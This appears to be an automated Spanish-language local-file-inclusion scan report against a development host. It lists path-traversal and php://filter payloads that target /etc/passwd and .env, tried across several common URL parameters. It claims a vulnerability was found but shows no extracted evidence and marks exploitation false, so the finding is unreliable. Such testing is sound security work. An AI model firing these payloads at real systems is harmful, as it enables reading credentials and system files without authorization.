# Informe LFI - 2026-04-27T154840
\n- Target: http://web.dev.local:8081
- VULN_FOUND: true
- Scan output: /app/reports/lfi_scan_output_2026-04-27T154840.txt
\n## Comandos ejecutados
Se realizaron peticiones curl a parámetros comunes con payloads de traversal y php wrappers.
\n## Payloads probados
"/etc/passwd", "../../../../../../etc/passwd", "php://filter/read=convert.base64-encode/resource=/etc/passwd", ".env", "/etc/hosts"
\n## Evidencia (líneas relevantes del escaneo)
2:=== http://web.dev.local:8081/?page=/etc/passwd ===
138:=== http://web.dev.local:8081/?page=../../../../../../etc/passwd ===
274:=== http://web.dev.local:8081/?page=../../../../../../../../etc/passwd ===
410:=== http://web.dev.local:8081/?page=php://filter/read=convert.base64-encode/resource=/etc/passwd ===
546:=== http://web.dev.local:8081/?page=.env ===
682:=== http://web.dev.local:8081/?page=../../../../../../.env ===
818:=== http://web.dev.local:8081/?page=/etc/hosts ===
954:=== http://web.dev.local:8081/?file=/etc/passwd ===
1090:=== http://web.dev.local:8081/?file=../../../../../../etc/passwd ===
1226:=== http://web.dev.local:8081/?file=../../../../../../../../etc/passwd ===
1362:=== http://web.dev.local:8081/?file=php://filter/read=convert.base64-encode/resource=/etc/passwd ===
1498:=== http://web.dev.local:8081/?file=.env ===
1634:=== http://web.dev.local:8081/?file=../../../../../../.env ===
1770:=== http://web.dev.local:8081/?file=/etc/hosts ===
1906:=== http://web.dev.local:8081/?include=/etc/passwd ===
2042:=== http://web.dev.local:8081/?include=../../../../../../etc/passwd ===
2178:=== http://web.dev.local:8081/?include=../../../../../../../../etc/passwd ===
2314:=== http://web.dev.local:8081/?include=php://filter/read=convert.base64-encode/resource=/etc/passwd ===
2450:=== http://web.dev.local:8081/?include=.env ===
2586:=== http://web.dev.local:8081/?include=../../../../../../.env ===
2722:=== http://web.dev.local:8081/?include=/etc/hosts ===
2858:=== http://web.dev.local:8081/?path=/etc/passwd ===
2994:=== http://web.dev.local:8081/?path=../../../../../../etc/passwd ===
3130:=== http://web.dev.local:8081/?path=../../../../../../../../etc/passwd ===
3266:=== http://web.dev.local:8081/?path=php://filter/read=convert.base64-encode/resource=/etc/passwd ===
3402:=== http://web.dev.local:8081/?path=.env ===
3538:=== http://web.dev.local:8081/?path=../../../../../../.env ===
3674:=== http://web.dev.local:8081/?path=/etc/hosts ===
3810:=== http://web.dev.local:8081/?doc=/etc/passwd ===
3946:=== http://web.dev.local:8081/?doc=../../../../../../etc/passwd ===
4082:=== http://web.dev.local:8081/?doc=../../../../../../../../etc/passwd ===
4218:=== http://web.dev.local:8081/?doc=php://filter/read=convert.base64-encode/resource=/etc/passwd ===
4354:=== http://web.dev.local:8081/?doc=.env ===
4490:=== http://web.dev.local:8081/?doc=../../../../../../.env ===
4626:=== http://web.dev.local:8081/?doc=/etc/hosts ===
4762:=== http://web.dev.local:8081/?template=/etc/passwd ===
4898:=== http://web.dev.local:8081/?template=../../../../../../etc/passwd ===
5034:=== http://web.dev.local:8081/?template=../../../../../../../../etc/passwd ===
5170:=== http://web.dev.local:8081/?template=php://filter/read=convert.base64-encode/resource=/etc/passwd ===
5306:=== http://web.dev.local:8081/?template=.env ===
5442:=== http://web.dev.local:8081/?template=../../../../../../.env ===
5578:=== http://web.dev.local:8081/?template=/etc/hosts ===
5714:=== http://web.dev.local:8081/?view=/etc/passwd ===
5850:=== http://web.dev.local:8081/?view=../../../../../../etc/passwd ===
5986:=== http://web.dev.local:8081/?view=../../../../../../../../etc/passwd ===
6122:=== http://web.dev.local:8081/?view=php://filter/read=convert.base64-encode/resource=/etc/passwd ===
6258:=== http://web.dev.local:8081/?view=.env ===
6394:=== http://web.dev.local:8081/?view=../../../../../../.env ===
6530:=== http://web.dev.local:8081/?view=/etc/hosts ===
6666:=== http://web.dev.local:8081/?p=/etc/passwd ===
6802:=== http://web.dev.local:8081/?p=../../../../../../etc/passwd ===
6938:=== http://web.dev.local:8081/?p=../../../../../../../../etc/passwd ===
7074:=== http://web.dev.local:8081/?p=php://filter/read=convert.base64-encode/resource=/etc/passwd ===
7210:=== http://web.dev.local:8081/?p=.env ===
7346:=== http://web.dev.local:8081/?p=../../../../../../.env ===
7482:=== http://web.dev.local:8081/?p=/etc/hosts ===
\n## Evidencia completa extraída
VULN_EXPLOITED=false
